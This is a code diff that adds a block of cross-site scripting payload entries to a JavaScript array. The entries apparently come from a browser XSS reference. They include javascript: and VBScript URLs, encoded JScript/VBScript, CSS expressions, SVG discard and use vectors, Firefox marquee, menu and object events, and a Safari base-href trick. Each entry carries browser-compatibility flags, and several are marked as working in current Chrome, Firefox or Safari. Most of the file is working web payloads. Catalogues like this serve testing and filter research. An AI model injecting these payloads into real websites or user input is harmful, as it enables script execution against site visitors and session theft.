@@ -1049,6 +1049,321 @@ const additionalPayloads = [
             `<textarea onselect=alert('Text selected') autofocus>Select this text</textarea>`,
             `<input onselect=console.log('Selection made') value="Select me">`
         ]
+    },
+    
+    // Classic XSS Vectors
+    {
+        event: "javascript-protocol",
+        description: "Image src with JavaScript protocol",
+        tag: "img",
+        code: `<img src="javascript:alert(1)">`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<img src="javascript:alert('XSS')">`,
+            `<img src="javascript:console.log('XSS')">`,
+            `<img src="javascript:eval('alert(1)')">`
+        ]
+    },
+    {
+        event: "body-background-js",
+        description: "Body background with JavaScript protocol",
+        tag: "body",
+        code: `<body background="javascript:alert(1)">`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<body background="javascript:alert('XSS')">`,
+            `<body background="javascript:console.log('XSS')">`,
+            `<body background="javascript:eval('alert(1)')">`
+        ]
+    },
+    {
+        event: "iframe-data-url",
+        description: "Iframe data urls (modern browsers use null origin)",
+        tag: "iframe",
+        code: `<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<iframe src="data:text/html,<script>alert('XSS')</script>">`,
+            `<iframe src="data:text/html,<body onload=alert(1)>">`,
+            `<iframe src="data:text/html,<img src=x onerror=console.log('XSS')>">`
+        ]
+    },
+    {
+        event: "vbscript-protocol",
+        description: "VBScript protocol (worked in IE)",
+        tag: "a",
+        code: `<a href="vbscript:MsgBox+1">XSS</a>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<a href="#" onclick="vbs:Msgbox+1">XSS</a>`,
+            `<a href="#" onclick="VBS:Msgbox+1">XSS</a>`,
+            `<a href="#" onclick="vbscript:Msgbox+1">XSS</a>`,
+            `<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>`,
+            `<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>`
+        ]
+    },
+    {
+        event: "jscript-compact",
+        description: "JScript compact (minimal JS version in IE)",
+        tag: "a",
+        code: `<a href="#" onclick="jscript.compact:alert(1);">test</a>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>`,
+            `<a href="#" onclick="jscript.compact:console.log('XSS');">test</a>`
+        ]
+    },
+    {
+        event: "jscript-encode",
+        description: "JScript.Encode allows encoded JavaScript",
+        tag: "a",
+        code: `<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D\`8#mgIAAA==^#~@">XSS</a>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D\`8#mgIAAA==^#~@">XSS</a>`
+        ]
+    },
+    {
+        event: "vbscript-encoded",
+        description: "VBScript.Encoded allows encoded VBScript",
+        tag: "iframe",
+        code: `<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>`
+        ]
+    },
+    {
+        event: "javascript-entities",
+        description: "JavaScript entities (worked in Netscape Navigator)",
+        tag: "a",
+        code: `<a title="&{alert(1)}">XSS</a>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<a title="&{console.log('XSS')}">XSS</a>`,
+            `<div title="&{alert('XSS')}">test</div>`
+        ]
+    },
+    {
+        event: "javascript-stylesheet",
+        description: "JavaScript stylesheets (supported by Netscape Navigator)",
+        tag: "link",
+        code: `<link href="xss.js" rel=stylesheet type="text/javascript">`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<style type="text/javascript">alert(1)</style>`
+        ]
+    },
+    {
+        event: "css-expression",
+        description: "CSS expressions (IE ≤7)",
+        tag: "div",
+        code: `<div style=xss:expression(alert(1))>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: false
+        },
+        category: "classic-vectors",
+        variations: [
+            `<div style=xss:expression(1)-alert(1)>`,
+            `<div style=xss:expressio\\6e(alert(1))>`,
+            `<div style=xss:expressio\\006e(alert(1))>`,
+            `<div style=xss:expressio\\00006e(alert(1))>`,
+            `<div style=xss:expressio&#x5c;6e(alert(1))>`
+        ]
+    },
+    {
+        event: "svg-discard",
+        description: "SVG discard tag with onbegin (Chrome)",
+        tag: "svg",
+        code: `<svg><discard onbegin=alert(1)>`,
+        compatibility: {
+            chrome: true,
+            firefox: false,
+            safari: false
+        },
+        category: "svg-vectors",
+        variations: [
+            `<svg><discard onbegin=console.log('XSS')>`,
+            `<svg><discard onbegin=eval('alert(1)')>`
+        ]
+    },
+    {
+        event: "svg-use-external",
+        description: "SVG use element with external URL",
+        tag: "svg",
+        code: `<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "svg-vectors",
+        variations: [
+            `<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />`,
+            `<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>`
+        ]
+    },
+    {
+        event: "firefox-media-events",
+        description: "Firefox media events (v107 and below)",
+        tag: "img",
+        code: `<img src=validimage.png onloadstart=alert(1)>`,
+        compatibility: {
+            chrome: false,
+            firefox: true,
+            safari: false
+        },
+        category: "firefox-specific",
+        variations: [
+            `<input type=image onloadend=alert(1) src=validimage.png>`,
+            `<img src=validimage.png onloadend=console.log('XSS')>`
+        ]
+    },
+    {
+        event: "firefox-marquee",
+        description: "Firefox marquee events (v125 and below)",
+        tag: "marquee",
+        code: `<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>`,
+        compatibility: {
+            chrome: false,
+            firefox: true,
+            safari: false
+        },
+        category: "firefox-specific",
+        variations: [
+            `<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>`,
+            `<marquee onstart=alert(1)>XSS</marquee>`,
+            `<marquee onstart=console.log('XSS')>XSS</marquee>`
+        ]
+    },
+    {
+        event: "firefox-menu-onshow",
+        description: "Firefox menu onshow event (v102 and below)",
+        tag: "menu",
+        code: `<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>`,
+        compatibility: {
+            chrome: false,
+            firefox: true,
+            safari: false
+        },
+        category: "firefox-specific",
+        variations: [
+            `<div contextmenu=xss><menu type=context id=xss onshow=console.log('XSS')></menu></div>`
+        ]
+    },
+    {
+        event: "protocol-assignment",
+        description: "Assignable protocol with location",
+        tag: "script",
+        code: `<script>location.protocol='javascript'</script>`,
+        compatibility: {
+            chrome: true,
+            firefox: false,
+            safari: true
+        },
+        category: "protocol-manipulation",
+        variations: [
+            `<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>`
+        ]
+    },
+    {
+        event: "javascript-newline",
+        description: "JavaScript protocol with new line",
+        tag: "a",
+        code: `<a href="javascript://%0aalert(1)">XSS</a>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "protocol-manipulation",
+        variations: [
+            `<a href="javascript://%0aconsole.log('XSS')">XSS</a>`,
+            `<a href="javascript://%0aeval('alert(1)')">XSS</a>`
+        ]
+    },
+    {
+        event: "safari-base-href",
+        description: "Safari base tag with JavaScript protocol",
+        tag: "base",
+        code: `<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: true
+        },
+        category: "safari-specific",
+        variations: [
+            `<base href="javascript:/a/-console.log('XSS')///////"><a href=../test.html>test</a>`
+        ]
+    },
+    {
+        event: "firefox-object-data",
+        description: "Firefox object data with JavaScript protocol (v140 and below)",
+        tag: "object",
+        code: `<object data="javascript:alert(1)">`,
+        compatibility: {
+            chrome: false,
+            firefox: true,
+            safari: false
+        },
+        category: "firefox-specific",
+        variations: [
+            `<embed src="javascript:alert(1)">`,
+            `<object data=# codebase=javascript:alert(document.domain)//>`,
+            `<embed src=# codebase=javascript:alert(document.domain)//>`,
+            `<object data="# alert(1)" codebase=javascript://>`,
+            `<object data="#! alert(1)" codebase=javascript:>`,
+            `<embed src="# alert(1)" codebase=javascript://>`,
+            `<embed src="#! alert(1)" codebase=javascript:>`
+        ]
     }
 ];
 
